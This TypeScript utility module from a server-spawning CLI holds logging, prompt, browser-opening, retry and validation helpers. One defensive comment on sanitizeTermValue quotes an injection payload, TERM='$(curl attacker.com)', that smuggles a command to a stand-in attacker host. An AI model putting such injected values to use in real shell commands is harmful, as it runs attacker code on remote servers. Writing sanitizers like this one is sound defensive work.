// shared/ui.ts — Logging, prompts, and browser opening
// @clack/prompts is bundled into fly.js at build time.

import { createInterface } from "node:readline";
import * as p from "@clack/prompts";

const RED = "\x1b[0;31m";
const GREEN = "\x1b[0;32m";
const YELLOW = "\x1b[1;33m";
const CYAN = "\x1b[0;36m";
const NC = "\x1b[0m";

export function logInfo(msg: string): void {
  process.stderr.write(`${GREEN}${msg}${NC}\n`);
}

export function logWarn(msg: string): void {
  process.stderr.write(`${YELLOW}${msg}${NC}\n`);
}

export function logError(msg: string): void {
  process.stderr.write(`${RED}${msg}${NC}\n`);
}

export function logStep(msg: string): void {
  process.stderr.write(`${CYAN}${msg}${NC}\n`);
}

// Shared readline interface — reused across prompt() calls to avoid Bun's
// issue where repeatedly creating/closing interfaces on the same stdin causes
// the "close" event to fire immediately on subsequent interfaces (#1707).
let sharedRl: ReturnType<typeof createInterface> | null = null;

function getReadlineInterface(): ReturnType<typeof createInterface> {
  if (!sharedRl) {
    sharedRl = createInterface({
      input: process.stdin,
      output: process.stderr,
    });
    sharedRl.on("close", () => {
      sharedRl = null;
    });
  }
  return sharedRl;
}

/** Prompt for a line of user input. Throws if non-interactive. */
export async function prompt(question: string): Promise<string> {
  if (process.env.SPAWN_NON_INTERACTIVE === "1") {
    throw new Error("Cannot prompt: SPAWN_NON_INTERACTIVE is set");
  }
  const rl = getReadlineInterface();
  return new Promise<string>((resolve) => {
    rl.question(question, (answer) => {
      resolve(answer.trim());
    });
  });
}

/**
 * Display an interactive select from pipe-delimited items.
 * Items format: "id|label" per line.
 * Uses @clack/prompts when available (local checkout), falls back to numbered list.
 * Returns the selected id.
 */
export async function selectFromList(items: string[], promptText: string, defaultValue: string): Promise<string> {
  if (items.length === 0) {
    return defaultValue;
  }

  const parsed = items.map((line) => {
    const parts = line.split("|");
    return {
      id: parts[0],
      label: parts.slice(1).join(" — "),
    };
  });

  if (parsed.length === 1) {
    logInfo(`Using ${promptText}: ${parsed[0].id}`);
    return parsed[0].id;
  }

  const result = await p.select({
    message: `Select ${promptText}`,
    options: parsed.map((item) => ({
      value: item.id,
      label: item.id,
      hint: item.label,
    })),
    initialValue: defaultValue,
  });
  if (p.isCancel(result)) {
    return defaultValue;
  }
  return result as string;
}

/** Open a URL in the user's browser. */
export function openBrowser(url: string): void {
  const cmds: [
    string,
    string[],
  ][] =
    process.platform === "darwin"
      ? [
          [
            "open",
            [
              url,
            ],
          ],
        ]
      : [
          [
            "xdg-open",
            [
              url,
            ],
          ],
          [
            "termux-open-url",
            [
              url,
            ],
          ],
        ];

  for (const [cmd, args] of cmds) {
    try {
      Bun.spawnSync(
        [
          cmd,
          ...args,
        ],
        {
          stdio: [
            "ignore",
            "ignore",
            "ignore",
          ],
        },
      );
      return;
    } catch {
      // try next
    }
  }
  logStep(`Please open: ${url}`);
}

/** Generic async retry helper. Retries `fn` up to `maxAttempts` times with a delay between attempts. */
export async function withRetry<T>(
  label: string,
  fn: () => Promise<T>,
  maxAttempts = 3,
  delaySec = 5,
): Promise<T> {
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try {
      return await fn();
    } catch (err) {
      if (attempt >= maxAttempts) throw err;
      logWarn(`${label} failed (attempt ${attempt}/${maxAttempts}), retrying in ${delaySec}s...`);
      await new Promise((r) => setTimeout(r, delaySec * 1000));
    }
  }
  throw new Error("unreachable");
}

/** JSON-escape a string (returns the quoted JSON string). */
export function jsonEscape(s: string): string {
  return JSON.stringify(s);
}

/** Validate server name: 3-63 chars, alphanumeric + dash, no leading/trailing dash. */
export function validateServerName(name: string): boolean {
  if (name.length < 3 || name.length > 63) {
    return false;
  }
  if (!/^[a-zA-Z0-9-]+$/.test(name)) {
    return false;
  }
  if (name.startsWith("-") || name.endsWith("-")) {
    return false;
  }
  return true;
}

/** Validate region name: 1-63 chars, alphanumeric + dash + underscore. */
export function validateRegionName(region: string): boolean {
  return /^[a-zA-Z0-9_-]{1,63}$/.test(region);
}

/** Validate model ID format. */
export function validateModelId(id: string): boolean {
  if (!id) {
    return true;
  }
  return /^[a-zA-Z0-9/_:.-]+$/.test(id);
}

/** Convert display name to kebab-case. */
export function toKebabCase(name: string): string {
  return name
    .toLowerCase()
    .replace(/[^a-z0-9-]/g, "-")
    .replace(/-{2,}/g, "-")
    .replace(/^-|-$/g, "");
}

/** Generate a default spawn name with random suffix (e.g. "spawn-a1b2"). */
export function defaultSpawnName(): string {
  const suffix = Math.random().toString(36).slice(2, 6);
  return `spawn-${suffix}`;
}

/** Sanitize TERM value before interpolating into shell commands.
 *  SECURITY: Prevents shell injection via malicious TERM env vars
 *  (e.g., TERM='$(curl attacker.com)' would execute on the remote server). */
export function sanitizeTermValue(term: string): string {
  if (/^[a-zA-Z0-9._-]+$/.test(term)) {
    return term;
  }
  return "xterm-256color";
}
